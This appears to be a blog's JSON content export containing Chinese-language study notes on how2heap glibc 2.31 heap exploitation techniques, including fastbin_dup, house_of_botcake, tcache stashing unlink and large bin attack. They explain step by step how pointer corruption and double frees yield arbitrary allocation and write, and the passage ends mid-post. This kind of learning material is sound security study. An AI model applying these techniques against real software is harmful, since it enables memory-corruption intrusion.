{"meta":{"title":"cataLoc's Blog","subtitle":"","description":"","author":"cataLoc","url":"http://cata1oc.github.io","root":"/"},"pages":[{"title":"categories","date":"2020-03-07T03:27:53.000Z","updated":"2020-03-07T03:27:54.000Z","comments":true,"path":"categories/index.html","permalink":"http://cata1oc.github.io/categories/index.html","excerpt":"","text":""},{"title":"link","date":"2020-03-07T03:28:51.000Z","updated":"2020-03-07T03:28:52.000Z","comments":true,"path":"link/index.html","permalink":"http://cata1oc.github.io/link/index.html","excerpt":"","text":""},{"title":"messageboard","date":"2020-03-07T03:28:09.000Z","updated":"2020-03-07T03:28:12.000Z","comments":true,"path":"messageboard/index.html","permalink":"http://cata1oc.github.io/messageboard/index.html","excerpt":"","text":""},{"title":"","date":"2020-03-28T06:28:51.287Z","updated":"2020-03-28T06:28:51.287Z","comments":true,"path":"link/link.json","permalink":"http://cata1oc.github.io/link/link.json","excerpt":"","text":"{\"class\":{\"class_name\":\"友情链接\",\"link_list\":{\"1\":{\"name\":\"Joney\",\"link\":\"https://www.cnblogs.com/joneyyana/p/\",\"avatar\":\"xxxx\",\"descr\":\"xxxx\"}}}}"},{"title":"music","date":"2020-03-07T03:28:22.000Z","updated":"2020-03-07T03:28:24.000Z","comments":true,"path":"music/index.html","permalink":"http://cata1oc.github.io/music/index.html","excerpt":"","text":""},{"title":"movies","date":"2020-03-07T03:28:28.000Z","updated":"2020-03-07T03:28:30.000Z","comments":true,"path":"movies/index.html","permalink":"http://cata1oc.github.io/movies/index.html","excerpt":"","text":""},{"title":"photos","date":"2020-03-07T03:28:40.000Z","updated":"2020-03-07T03:28:42.000Z","comments":true,"path":"photos/index.html","permalink":"http://cata1oc.github.io/photos/index.html","excerpt":"","text":""},{"title":"tags","date":"2020-03-07T03:27:42.000Z","updated":"2020-03-07T03:27:44.000Z","comments":true,"path":"tags/index.html","permalink":"http://cata1oc.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"堆基础06-how2heap进阶篇","slug":"堆基础06-how2heap进阶篇","date":"2022-08-20T15:45:38.000Z","updated":"2022-08-20T15:59:18.718Z","comments":true,"path":"2022/08/20/堆基础06-how2heap进阶篇/","link":"","permalink":"http://cata1oc.github.io/2022/08/20/%E5%A0%86%E5%9F%BA%E7%A1%8006-how2heap%E8%BF%9B%E9%98%B6%E7%AF%87/","excerpt":"","text":"前言 学习材料：shellphish 团队在 Github 上开源的堆漏洞系统教程 “how2heap” glibc版本：glibc2.31 操作系统：Ubuntu 20.04 示例选择：本篇依旧参考pukrquq师傅基于 glibc2.34 版本的分析文章，选取与其文章中第三部分相同的 poc 示例 poison_null_byte源码分析完整版 简化版 他这里注释标记出了 step1~step7，咱就按照他这个来分析： step 1: step 2: step 3: step 4: step 5: step 6: step 7: 执行分析 调试分析原理小结house_of_lore源码分析完整版 简化版 橙色方框： malloc() 1 个 0x110 大小的 chunk 作为 victim，并获取 victim 指针对应的 chunk 首地址作为变量 victim_chunk malloc() 7 个 0x110 大小的 chunk 用于填充 tcache bin 初始化一个 fake_freelist，这里的 freelist 是伪造的一个包含 7 个 free chunk 的链表，并不是包含空闲分配区的 freelist，这个概念在分析 __libc_malloc() 的辅助宏 arean_get 时有提到 这个 freelist 是一个位于栈中 7*4 的数组，简单理解，看作 7 个 chunk 就行了 先对 freelist 初始化，将前 6 个 chunk 的 bk（fake_freelist[i][3]）指向下一个 chunk（fake_freelist[i+1]） 将第 7 个 chunk 的 bk 设置 NULL 再对 stack_buffer_1 与 stack_buffer_2 进行初始化，这两个也是位于栈中的 chunk： stack_buffer_1->fd = victim_chunk stack_buffer_1->bk = stack_buffer_2 stack_buffer_2->fd = stack_buffer_1 stack_buffer_2->bk = freelist[0] 经过上述初始化，这些位于栈中的 fake chunk，形成了如下的一个状态： 蓝色方块： malloc() 一个 1008(0x3F0) 大小的 chunk 作为 padding 防止 free() 后的 chunk 与 top chunk 合并 free() 掉 7 个 0x110 大小的 chunk，填满 tcache bin free() 0x110 大小的 victim_chunk 进入 unsorted bin malloc() 一个 1216(0x4C0) 大小的 chunk，使得 victim_chunk 从 unsorted bin 中 进入 small bin 此时 small bin 只有一个 chunk，情况如下 红色方框： 将 victim[1] 也就是 victim_chunk->bk 的值设置为 stack_buffer_1，然后 small bin 中就变成了下图这样： 然后 malloc() 7 个 0x110 大小的 chunk，把 tcache bin 清空 再 malloc() 1 个 0x110 大小的 chunk 把 victim 给申请出来，因为 small bin 取的 bin->bk 的位置，所以 victim 会被申请出来 接下来，stack_buffer_1、stack_buffer_2、freelist[0~4] 会依次进入 tcache bin 中将其填满 small bin 中将剩下 freelist[5] 与 freelist[6] 能进行以上操作是因为，small bin 在分配时（源码如下图所示），仅校验了 victim->bk->fd == victim，进入 tcache bin 的过程中，也只校验了 bin->bk 是否为空，因此无法感知到在 victim 后面精心构造的 fake chunk，也就使得这些 fake chunk 可以顺理成章的进入 victim 大小对应的 tcache bin 中 粉色方框： 由于伪造的 fake chunk 已经塞满了 tcache bin，因此再 malloc() 一个 victim 大小的 chunk 时，就会从这个 tcache bin 中取出一个 chunk 这个 chunk 的地址是位于栈中的，因为之前伪造的所有 fake chunk 都是位于栈中的 接下来他这个 poc 演示了一种绕过 canary 的思路 通过内建函数 __builtin_return_address(0) 获取到当前函数的返回地址 算出返回地址与申请到的栈中地址之间的偏移 将测试函数地址写入到返回地址中，使得程序返回时可以执行这个测试函数 此 poc 通过申请一个栈中地址，绕过 canary，达到一种类似栈溢出的效果 当然，这个手法可以做很多事，这里定义的 fake chunk 位于栈中，所以申请到的是一个栈中的地址，理论上可以申请一个任意的地址 执行分析 这个执行注释写的挺细，但是打印出来的结果并不全 仅打印了 victim 进入 unsorted bin 与进入 small bin 后，victim->bk 与 victim->fd 的值 但是修改后 victim->bk 的值并未展示，这点还是需要看调试的结果 最后粉色框框出了执行了测试代码，也证明了示例的成功，可以成功申请到设定的栈中的地址 调试分析 先打印 stack_buffer_1 与 stack_buffer_2 的地址： stack_buffer_1 地址是 0x7fffffffdc10，这是它作为 fake chunk 的地址，也是链入 small bin 中的地址，链入 tcache bin 的地址则为 0x7fffffffdc20。stack_buffer_2 同理，不再解释 free() victim 后： victim 在被 free() 后，先进入了 unsorted bin malloc(1200) 后： 在 malloc() 一个大的内存块后，victim 被赶到了 0x110 大小的 small bin 中，之后那些 free chunk 也要到这个 small bin 里 修改 victim->bk 后： 可以看到伪造的 free chunk 都顺着 victim->bk 给链进来了。其中前 2 个是 stack_buffer_1 和 stack_buffer_2，后面的就是 freelist 了 malloc() victim 前： 此时申请了 7 个 0x110 的 chunk，清空了 tcache bin malloc() victim 后： 原本 small bin 中的 victim 被返回给用户 victim->bk 开始的连续 7 个 fake chunk 顺势进入了 tcache bin 符合了源码分析的推论，后面那个类似栈溢出绕过 canary 的手法这里就不展开了 原理小结 原理很像前一篇介绍的 tcache_stashing_unlink_attack，两者都是对 small bin 进行攻击，利用的 glibc 的缺陷是相同的，但是两个 poc 的具体利用手法和应用场景有所不同，这里对两者进行简单的比较，并总结它们的利用前提： House Of Lore： small bin 上只有一个 victim chunk 控制 small bin 上 victim 的 bk 指针，并设置一个 fake chunk 的 fd 指向 victim chunk 可以实现分配任意指定位置的 chunk Tcache Stashing Unlink Attack： small bin 上有多个 chunk，且 bin->bk != victim_chunk，即 victim chunk 不会第一个被分配出去，这样就不用设置一个 fake chunk 的 fd 指向 victim chunk 了 控制 small bin 上 victim 的 bk 指针 同样可以实现分配任意指定位置的 chunk 利用前提： 可以控制 small bin 中 victim chunk 的 bk 指针 程序可以越过 tcache 申请 chunk（填满 tcache bin 或者使用 calloc()） 程序至少可以分配两种不同大小，且在 free() 时可以进入 unsorted bin 的 chunk house_of_einherjar源码分析完整版 简化版 执行分析 调试分析原理小结house_of_mind_fastbin源码分析完整版简化版执行分析调试分析原理小结mmap_overlapping_chunks源码分析完整版简化版执行分析调试分析原理小结参考链接 看雪：how2heap深入浅出学习堆利用 Github：shellphish/how2heap CSDN：Tcache Stashing Unlink Attack (House of Lore Attack)","categories":[],"tags":[{"name":"二进制安全","slug":"二进制安全","permalink":"http://cata1oc.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"}]},{"title":"堆基础05-how2heap初级篇","slug":"堆基础05-how2heap初级篇","date":"2022-08-16T15:45:25.000Z","updated":"2022-08-20T16:13:31.936Z","comments":true,"path":"2022/08/16/堆基础05-how2heap初级篇/","link":"","permalink":"http://cata1oc.github.io/2022/08/16/%E5%A0%86%E5%9F%BA%E7%A1%8005-how2heap%E5%88%9D%E7%BA%A7%E7%AF%87/","excerpt":"","text":"前言 学习材料：shellphish 团队在 Github 上开源的堆漏洞系统教程 “how2heap” glibc版本：glibc2.31 操作系统：Ubuntu 20.04 示例选择：本篇依旧参考pukrquq师傅基于 glibc2.34 版本的分析文章，选取与其文章中第二部分相同的 poc 示例，由于 glibc2.31 中尚未引入 PROTECT_PTR 保护机制，因此本篇将不包含 decrypt_safe_linking 的利用手法介绍 fastbin_reverse_into_tcache源码分析由于源码较长，本篇中的 poc 示例会先贴出源码，删减掉不影响程序逻辑的代码后，再对简化后的版本进行分析 完整版 简化版 橙色方框： malloc() 14 个可以容纳 0x40 大小的内存块（即大小 0x50 的 chunk） 先 free() 7 个以填满 0x50 大小的 tcache bin 再 free() 1 个到 0x50 大小的 fast bin 中，free() 前获取它的指针保存为 victim 再 free() 6 个到 0x50 大小的 fast bin 中，fast bin 采用头插法入链，victim 会变成链上最后一个 chunk 蓝色方框： 初始化一个位于栈中的数组 填充 0xcd 用于实验后的对照 红色方框： victim 指向的值就是 victim 这个 chunk 对应的 fd 指向的值，由于 victim 位于 fast bin 末尾，因此其指向 NULL 设置 victim 指向 stack_var[0] 对应的地址 此操作，相当于把 stack_var[0] 所在地址作为 chunk 首地址放入 fast bin 中 换句话说，stack_var 此时成为 fast bin 中的最后一个 chunk，而 victim 则是倒数第二个 chunk，此时 fast bin 中有 8 个 chunk 粉色方框： 先 malloc() 7 个可以容纳 0x40 大小的内存块，清空 tcache 打印一下 stack_var 这个数组中的值，目前应该一切正常，全部为 0xcd 再 malloc() 1 个可以容纳 0x40 大小的内存块，回顾一下此时 malloc() 会进行哪些操作： 由于 0x50 大小的 tcache bin 已经空了，所以会进入 _int_malloc() 进行分配 _int_malloc() 会先找 fast bin，发现 fast bin 中有符合要求的 chunk 这时会先把符合要求的 chunk 从 fast bin 中取下来，稍后会返回给用户 进入一个循环，对 fast bin 中剩下的 chunk 进行遍历，把 0x50 大小的 chunk 全部放入 0x50 大小的 tcache bin 中，直到 tcache bin 满了（达到 7 个）或 fast bin 空了，循环才停止 然后把先前取下来的 chunk 返回给用户 在实际场景中，经过上述操作： 由于 victim 在 fast bin 是倒数第二个，stack_var 是倒数第一个，因此不会率先返回给用户 fast bin 上的第一个 chunk 会被取下，用于稍后返回，此时 fast bin 上还剩下 7 个 chunk 接下来，这 7 个 chunk 会在一个循环中，被放入到 0x50 大小的 tcache bin 中 stack_var 这个 chunk 会最后从 fast bin 被取出来，进入 tcache bin 后会成为第一个 此时由于 tcache_put() 会设置 chunk 的 next 与 key 两个字段，因此理论上 stack_var[2] 与 stack_var[3] 处会被赋值 然后就是对照实验，再打印一下 stack_var，会发现，此时 stack_var[2] 与 stack_var[3] 对应的值应该已经被修改 最后再 malloc() 一下，由于 stack_var 这个 chunk 位于 tcache bin 的开头，所以我们拿到的就是 stack_var 这个 chunk，返回的指针也就指向 stack_var[2] 的位置 执行分析 这里比较直观的感受就是 stack_var 的值确实变了，变的也确实是 stack_var[2] 与 stack_var[3] 位置 这大概也能推论出 stack_var 确实是进入 bin 中了，但仍无法看出 tcache bin 与 fast bin 中发生的变化，这需要进一步调试 调试分析 free() victim 后： 可以看到，此轮运行，victim 对应的 chunk 地址为 0x5555555594c0 14 个块全部 free() 后： 由于我环境中 pwndbg 的 bins 指令显示不全，我也不清楚是怎么回事，这里只好用 heap 指令查看堆空间 设置了 victim 指向 stack_var 后： 可以看到此时 victim 的 fd 被设置成了栈中的地址，也就是 stack_var malloc() 触发 fastbin reverse into tcache： 最后可以看到，fast bin 中的 chunk 进入 tcache bin 中，并且 stack_var 成了 tcache bin 中的第一个 chunk，此时只需再 malloc() 一次就可以将其取出 原理小结 利用手法是通过溢出等手段，修改进入 fast bin 中 chunk 的 fd 指针，指向一个伪造的 chunk，实现任意地址覆盖 原理是当进入 _int_malloc() 中分配 chunk 时，如果在 fast bin 中发现了合适的 chunk ，那么会将剩余的 chunk 填入 tcache bin 中 tcache_stashing_unlink_attack源码分析完整版 简化版 橙色方框： 先 malloc() 9 个可以容纳 0x90 大小的内存块，即 9 个 0xa0 大小的 chunk free() 掉其中 7 个去填满 0xa0 大小的 tcache bin 这里有个细节，剩下 2 个还没 free() 掉的，在堆上是不连续的，也就是说，这样进入 unsorted bin 后，他俩就不会合并了。因为 tcache bin 中的 chunk 本身是处于 inuse 状态，因此不会与 unsorted bin 中的 chunk 进行合并 接下来把剩下俩给 free() 掉，由于大小为 0xa0，是不会进入 fast bin 的（最大支持 0x80 的 chunk），所以会进入 unsorted bin，注意 unsorted bin 进入时会放在 bin 与 bin->fd 之间，取的是 bin 与 bin->bk->bk 之间的 chunk，所以是先进先出(FIFO)，small bin 同理 蓝色方框： 第一次 malloc() 一个可以容纳 0xa0 大小的 chunk（即 0xb0 大小的 chunk），显然此时堆中没有合适大小的 chunk，所以最终会通过 top chunk 进行分配，但是在 _int_malloc() 的查找过程中，会将 unsorted bin 中的 chunk 放入对应的 bin 中 因此先前 free() 掉的 chunk_lis[0] 与 chunk_lis[2] 这俩指针对应的 chunk 就进入了 small bin small bin 与 unsorted bin 都是先进先出，因此这波操作完 small bin 大概是： smallbin(0xa0) chunk_lis[2] chunk_lis[0] 然后再 malloc() 两个 0xa0 的 chunk，用于在 tcache bin 中腾出位置 红色方框： 核心操作都在这了，先给 stack_var[3] 赋值为 &stack_var[2]，这是将 stack_var 伪造成一个 fake chunk，其中 stack_var[3] 表示这个 fake chunk 的 bk，此时赋值为一个合理存在的地址，仅此而已，用于过掉 glibc 中的校验，具体咋过，后面会介绍到 这里将 stack_var 这个 fake chunk 赋值给 chunk_lis[2][1]，chunk_lis[2] 本身位于 fd 的位置，chunk_lis[2][1] 则是 bk 的位置，所以这一步，就是将 chunk_lis[2] 在 small bin 中对应的 chunk 的 bk 设置为了 stack_var，上面这两步的操作变化大概是这样： 接下来，进行了一次 calloc() 的操作来申请内存块，calloc() 不会访问 tcache bin，而是直接进入 _int_malloc() 根据先前的知识，small bin 是先进先出，因此先进入 small bin 的 chunk_lis[0] 会被取出来分配给用户 接下来，_int_malloc() 中会将 small bin 中余下的 chunk 往对应大小（也就是 0xa0）的 tcache bin 中放，由于 tcache bin 中目前已经有 5 个 chunk 了，因此最多只能再放 2 个，按照先进先出的顺序，chunk_lis[2] 会被先行放入 chunk 中，接下来，会进行如下判断（下面放上源码）： chunk_lis[2]->bk 是否为链表头 bin，此时这个值为 stack_var（默认情况下应该是链表头 bin） 然后会再判断一次这个值是否为空 若不为空，说明这是一个 chunk，则获取这个 chunk 的 bk，也就是这里 fake chunk 的 bk，将其赋值给 bck。前面设置了这个 bk 的值为一个合理存在的地址，也就是为了过掉这里的校验，不然 bck 的值不合法，那么后面执行 bck->fd = bin 可能就出错了。由于 tcache bin 的容量是 7 个，此时 fake chunk 会在 chunk_lis[2] 之后进入 tcache bin 中，并位于第一个 粉色方框： 最后再 malloc() 一下，因为 tcache bin 中的第一个位置已经是我们伪造的 fake chunk，自然也就获取到了这个 chunk 执行分析 这里可以看出最后一次 malloc() 得到的是一个栈中的地址，并且刚好是 fake_chunk->bk 处的值，因为这里保存的值为 fake_chunk[2] 的地址，也就是 fake_chunk 的 fd 的位置 调试分析 9 个内存块都 free() 后： 可以看到，此时 0xa0 大小的 tcache bin 已满，unsorted bin 中有两个 chunk malloc(0xa0) 后： 此时 unsorted bin 中的两个 chunk 已进入到 0xa0 大小的 small bin 中 两次 malloc(0x90) 后： 两次 malloc() 给 tcache bin 中腾出了两个位置 设置 fake chunk 后： 此时 chunk_lis[2] -> bk 处的值已经被修改为 fake chunk 的地址 calloc() 执行后： 此时 fake chunk 已进入 0xa0 大小的 tcache bin 中 原理小结 本例和前面的 fastbin_reverse_into_tcache 很像，这里也是通过修改 small bin 然后利用 small bin 进入 tcache bin 来实现任意地址写 unsorted bin 与 small bin 都是双链表，且都是先进先出，都是进入时插入 bin 与 bin->fd 之间，取的是 bin 与 bin->bk->bk 之间的 chunk 因此修改 small bin 与前一个例子修改 tcache 不太一样，这里修改的是 victim->bk 的值 造成漏洞的原因主要是 glibc 中将 small bin 导入 tcache bin 时，只检查了 tc_victim->bk 这个指针，没有检查链表完整性，从而有了利用的空间 house_of_botcake源码分析完整版 简化版 橙色方框： 定义一个数组，位于栈中，用作后续 malloc() 的返回值，也可以理解为本例中的 fake chunk 初始化 7 个 0x110 大小的 chunk，用于填充 tcache bin malloc() 1 个 0x110 大小的 chunk，用于 free() 后的块合并 malloc() 1 个 0x110 大小的 chunk，作为 victim chunk malloc() 1 个 0x20 大小的 chunk，作为 padding，防止 victim chunk 与 top chunk 合并 蓝色方框： free() 掉 7 个 0x110 大小的 chunk，填充满 0x110 大小的 tcache bin 首次 free() 掉 victim chunk，victim chunk 此时会进入 unsorted bin free() 掉用于合并的 chunk，它会与上一步 free() 掉的 victim chunk 进行合并，形成一个 0x220 大小的 chunk，然后进入 unsorted bin 中 malloc() 一个 0x110 大小的 chunk，使得 tcache bin 中腾出一个位置 红色方框： 第二次 free() 掉 victim chunk，第二次 free 的 victim chunk 会进入刚刚腾出位置的 0x110 大小的 tcache bin 中 malloc() 一个 0x130 大小的 chunk，由于 tcache bin 中没有符合的，fast bin 与 small bin 也没有符合大小的 所以会进入 unsorted bin 的处理流程，此时： unsorted bin 中刚好只有一个 chunk 分割后的剩余大小也大于 MINSIZE 这个 chunk 符合 small bin 的范围 同时也是 last remainder（其实这里我没搞明白，为什么它是 last remainder chunk） 因此，分配器就会从这个 0x220 的 chunk 里面分出 0x130 大小返回给用户 接下来修改刚刚拿到的这个 chunk[0x130 - 0x8*2] 的位置，原先合并前两个 chunk 大小都是 0x110，这里修改 0x120 位置的值为 stack_var，也就是修改了原先第二个 chunk 的 fd 指针的位置，而这个被修改的 fd 的 chunk 也就是 victim chunk，它已经经过 double free 被放在了 tcache bin 里 在修改 fd 指针后，相等于修改了 tcache bin 中 victim chunk 的后一个 chunk，将其设置为了 stack_var，此时 tcache bin 中的状态大概为： 粉色方框： 先 malloc() 一个 0x110 的 chunk，把 victim chunk 给申请走 再 malloc() 一个 0x110 的 chunk，就可以拿到一个 &stack_var[-2] 开始的 chunk 了，返回的指针刚好是 stack_var 执行分析 执行结果看不出什么东西，只能看出最后成功申请了一个栈空间的地址 调试分析 unsorted bin 中 chunk 合并后： 合并前，unsorted bin 中的 chunk 位于 0x555555559b10 合并后，unsorted bin 中的 chunk 位于 0x555555559a00 double free 后： double free 后发现 tcache bin 中出现了合并前的那个 chunk，之所以是 0x555555559b20，是因为 tcache bin 中是用 fd 来链接 chunk unsorted bin 中 chunk 分割后： 分割后，unsorted bin 中的 chunk 变成了 0x555555559b30 用新申请的 chunk 修改的位置则是 0x555555559b20，也就是合并前的 victim chunk 的 fd 修改 victim chunk 的 fd 后： 修改 victim chunk 的 fd 后发现 tcache bin 中的第二个 chunk 已经变成了我们可以控制的栈中的地址 原理小结 原理非常简单，double free 实现 tcache bin 与 unsorted bin 中包含相同 chunk 利用分配内存时会对 unsorted bin 的 last remainder chunk 进行分割，获取到 victim chunk 前面地址的一个 chunk，然后利用覆盖实现任意地址写入 large_bin_attack源码分析完整版 简化版 橙色方框： 定义一个局部变量 target，位于栈中 malloc() 一个 0x430 大小的 chunk，然后再 malloc() 一个 0x20 大小的 padding 防止 free() 时与 top chunk 合并 malloc() 一个 0x420 大小的 chunk（略小于前一个 chunk，但属于 large bin 的范围内，且与前一个 chunk 位于同一个 idx 对应的 large bin 上），然后再 malloc() 一个 0x20 大小的 padding 防止 free() 时与 top chunk 合并 蓝色方框： free() 掉 0x430 大小的 chunk 进入 unsorted bin malloc() 一个 0x440 大小的 chunk，使得 unsorted bin 处理流程中将 0x430 大小的 chunk 传入 large bin 中 free() 掉 0x420 大小的 chunk 进入 unsorted bin 此时，unsorted bin 中有一个 0x420 大小的 chunk，large bin 中有一个 0x430 大小的 chunk 红色方框： 将 p1[3] 位置的值设置为 &target - 0x20 p1[3] 这个位置就是 0x430 大小的 chunk 对应的 bk_nextsize 这个操作相当于 p1->bk_nextsize = &target - 0x20 粉色方框： 此时再 malloc() 一个 0x440 大小的 chunk，该操作再次触发 unsorted bin 处理流程，使得 0x420 大小的 chunk 传入 large bin 中 从 unsorted bin 进入 large bin 中的过程有 4 种可能的情况，具体可以参考 malloc源码分析-Unsorted Bin处理流程，此处 0x420 大小的 chunk 进入 large bin 属于文中描述的情形二，具体在源码中为下图框出部分 红框中圈出了关键的两个运算： victim->bk_nextsize = fwd->fd->bk_nextsize fwd->fd 指向的就是原本位于 large bin 中的那个 0x430 大小的 chunk 这个 chunk 的 bk_nextsize 已经设置为了 &target - 0x20 victim 就是刚刚准备进入 large bin 的0x420 大小的 chunk 这里就是将 victim 的 bk_nextsize 设置为了 &target - 0x20 victim->bk_nextsize->fd_nextsize = victim 将 victim->bk_nextsize 换成 &target - 0x20 对于 large bin chunk 来说，fd_nextsize 的位置就是 chunk首地址 + 0x20/ 返回指针ptr + 0x10 的位置 假设我们把 fd_nextsize 以 chunk首地址 + 0x20 代入，可以得到 &chunk = victim 也就是说，此时 target 所在的这个地址，被赋上了 victim 对应 chunk 的首地址（0x420 大小的 chunk，对应指针 p2） 我们知道，返回指针位于 chunk首地址 + 2*SIZE_SZ 的位置，即可满足示例中 p2 - 2*0x8 == target 这个逻辑 执行分析 这个 poc 的描述语句也是比较细的，可以清晰的看到，位于栈中的局部变量 target，原本保存的值为 0，之后被替换成了 p2 所对应的 chunk 的首地址（源码中使用的都是 p2-2*SIZE_SZ 来表示 p2） 调试分析 0x430 大小的 chunk 进入 large bin 后： 进入 large bin 后，这个 0x430 大小的 chunk 位于 0x555555559290 0x420 大小的 chunk 进入 unsorted bin 后： 进入 unsorted bin 后，这个 0x420 大小的 chunk 位于 0x5555555596e0，因为是后申请的，所以位置更靠近 top chunk，由于都申请了 padding，所以不会与 top chunk 合并 修改 0x430 对应 chunk 的 bk_nextsize 后： 这部比较关键，但是 bins 看不出来，直接用 heap 指令看，可以发现： 修改了位于 large bin 中这个 0x430 大小的 chunk 的 bk_nextsize，设置成了一个栈中的地址，正是 &target - 0x20 的位置 修改前，由于 large bin 中只包含这一个 chunk，因此 fd_nextsize/bk_nextsize 都指向自身 0x420 大小的 chunk 进入 large bin 后： 将 0x420 大小的 chunk 从 unsorted bin 移入 large bin 后： 0x420 大小的这个 chunk 的 bk_nextsize 的值修改为了 &target - 0x20 这个地址，这是执行 victim->bk_nextsize = fwd->fd->bk_nextsize 这条语句后的结果 &target 地址处（0x7fffffffdd40）保存的值已经变成了 0x420 这个 chunk 的首地址，这是执行 victim->bk_nextsize->fd_nextsize = victim 这条语句后的结果，注意这条语句中的 victim，正是 0x420 这个 chunk 的首地址 原理小结 利用了 unsorted bin 中的 chunk 进入 large bin 时校验不全的漏洞 当进入 large bin 的 chunk 小于这条 bin 上的所有 chunk 时，则会放在一个边缘的位置。此时原先最小的 chunk，会与当前准备放入的 chunk 通过 fd_nextsize/bk_nextsize 进行链接，但是 glibc 中未对原先最小的 chunk 的 bk_nextsize 的值进行校验，如果我们修改了这个值（例如改成了一个地址 0x7fffffff0000），那么在经过 glibc 中的运算后，这个 0x7fffffff0020（0x7fffffff0000 -> fd_nextsize） 这个地址就会存着先前准备放入的 chunk 的首地址。这样就获取了一个可以编辑的地址 参考链接 看雪：how2heap深入浅出学习堆利用 Github：shellphish/how2heap","categories":[],"tags":[{"name":"二进制安全","slug":"二进制安全","permalink":"http://cata1oc.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"}]},{"title":"堆基础04：how2heap入门篇","slug":"堆基础04-how2heap入门篇","date":"2022-08-10T06:54:59.000Z","updated":"2022-08-20T15:44:46.585Z","comments":true,"path":"2022/08/10/堆基础04-how2heap入门篇/","link":"","permalink":"http://cata1oc.github.io/2022/08/10/%E5%A0%86%E5%9F%BA%E7%A1%8004-how2heap%E5%85%A5%E9%97%A8%E7%AF%87/","excerpt":"","text":"前言 学习材料：“how2heap” 是 shellphish 团队在 Github 上开源的堆漏洞系统教程，包含很多常见的堆漏洞教学示例，本篇也将使用此教程 中的示例完成对堆利用的学习 glibc版本：glibc2.31 操作系统：Ubuntu 20.04 示例选择：本篇参考了pukrquq师傅基于 glibc2.34 版本的分析文章，选用了在高版本依然存在的利用方式进行分析，文章的分析顺序与pukrquq师傅一致，按照示例 poc 代码由简单到复杂的过程进行 fastbin_dup源码分析 先分析源码，可能是为了方便理解，源码中包含大量的描述性语句，会影响阅读，所以这里分块来看： 橙色方框： 申请 8 个能容纳 8 字节的 chunk，而 MINSIZE 刚好可以容纳 8 字节，因此这里是申请了 8 个 0x20 字节大小的 chunk。由于此时所有 bin 都是空的，因此这个 8 个 chunk 是从 top chunk 中分配的。为了方便描述，此示例后面所有申请能容纳 8 字节 chunk 的行为，我都会描述成申请 0x20 字节大小的 chunk 再释放这 7 个 0x20 大小的 chunk，用于填充 0x20 大小的这条 tcache bin，7 个刚好填满 蓝色方框： 通过 calloc() 方法分配申请 3 个 0x20 字节大小的 chunk 这里调用的是 calloc() 而不是我们先前分析的 malloc()，它俩的执行路线略有不同，区别如下： calloc() -> __libc_calloc() -> _int_malloc() malloc() -> __libc_malloc() -> _int_malloc() 在 glibc2.31 版本的 __libc_calloc() 中，不会尝试从 tcache 中分配 chunk，其分配内存的行为是从 _int_malloc() 才开始的，因此通过 calloc() 申请内存时只需要关注 _int_malloc() 即可 由于此时除了 tcache bin 以外，所有 bin 都是空的，所以这 3 个 chunk 还是从 top chunk 中分配的 红色方框： 这里是一个典型的 double free 操作，但是为了防止被 glibc 中内置的机制检测出，这里选择在 2 次 free(a) 操作之间进行一次 free(b) 的操作。接下来我们分析下这顿操作会发生什么，这部分的前置知识可以参考我先前 free 的分析文章 free() 开始前： 0x20 大小的 fast bin 是空的 fastbinsY[0x20] -> NULL 第一次 free(a) ： 由于 0x20 字节大小的 tcache bin 已经满了，所以会释放到 0x20 大小的 fast bin 中 fastbinsY[0x20] -> a free(b) ： 与上面类似，也会释放到 0x20 大小的 fast bin 中，由于采用头插法，先进后出，所以会放在 a 前面 fastbinsY[0x20] -> b -> a 第二次 free(a)： double free 的核心操作，第二次释放 a，又因为 _int_free() 只会检查前后两个 chunk 是否相同，因此这里可以成功释放，将 a 再次放入 fast bin 链表头指向的位置 fastbinsY[0x20] -> a -> b -> a 粉色方框： 这部分依次申请 3 个 0x20 大小的 chunk，用的还是 calloc()，从而避免申请到 tcache bin 中的 chunk。又因为此时 fast bin 中的有 chunk 的，所以不会去分配 top chunk 了，直接从 fast bin 中拿。并且由于 tcache bin 已经满了，因此在 _int_malloc() 中从 fast bin 拿到 chunk 后不会放入 tcache bin 而是直接返回这个 chunk。接下来看看执行过程 malloc() 执行前： fastbinsY[0x20] -> a -> b -> a 第一次 malloc()： fast bin 是先进后出，所以先获取到第二个 free 的 a fastbinsY[0x20] -> b -> a 第二次 malloc()： 然后获取到 b fastbinsY[0x20] -> a 第三次 malloc()： 最后获取到第一个 free 的 a fastbinsY[0x20] -> NULL 由于第一次和第三次 malloc() 获取到的都是 a，所以这两次获取到了完成一样的地址，那么修改其中一个的内存就可以影响到另一个，从而实现利用 执行分析 观察执行结果，可以发现，第二次申请 3 个内存块时，第1次和第2次获取到了相同的地址 调试分析接下来，我们通过 pwndbg 简单调试一下程序，并观察 3 次 free 前后堆空间的变化，通过 bins 指令可以查看堆空间： free() 开始前： 第一次 free(a) ： free(b) ： 第二次 free(a)： 经过调试，观察 3 次 free 执行前后堆中的变化，可以发现这和前面源码分析时的推论是一致的，第二次 malloc 3 个 内存块的就不贴图了，这里推荐亲自动手调试一下，和前面的结论也是一致的。有一点需要补充说明，图中 bins 显示的 tcache bin 与 fast bin 中的是 chunk 地址，而 free 的参数是一个指向数据区的指针，即 chunk+2*SIZE_SZ（64 位下为 chunk+0x10）的位置，这一点在调试时需要注意转换。 原理小结 这个例子演示了经典的 double free 场景，通过对同一个指针 free 2次，使得 fast bin 中存在相同地址的 chunk，从而影响用户后续通过 malloc 申请的内存 在 glibc2.26 引入 tcache 后，则需要先填充 tcache，再进行 double free 在掌握 malloc/free 相关的源码后，对于其中的利用手法理解也会更加透彻，所以推荐学习 how2heap 前先了解相关源码 tcache_house_of_spirit源码分析 橙色方框： 定义一个指针 a，未初始化 定义一个数组 fake_chunks，位于栈空间中，大小为 10，共 80/0x50 字节，用于设置 fake chunk 蓝色方框： 设置 fake_chunks[1] 的值为 0x40 这条语句的目的是构造一个 chunk。chunk 前 4 个位置通常为 prev_size、size、fd 和 bk 当 chunk 处于 inuse 状态下，其 fd 与 bk 字段用于存放数据，其中 fd 所在的地址正是返回给用户的指针所指向的地址 此语句的意图，设置一个 fake chunk 的 size 值为 0x40 红色方框： 将指针 a 初始化为 fake_chunk[2] 处的地址 假设我们构造的这个 fake chunk 表示一个实际的 chunk，那么 &fake_chunk[0] 表示 chunk 首地址，&fake_chunk[2] 则是 malloc() 申请该 chunk 时返回的地址。 此语句的意图正是让 a 成为一个申请了 fake chunk 的指针 然后将指针 a 给 free 掉，让这个 fake chunk 释放到 tcache bin 中 粉色方框： 注意一点，我们设置了 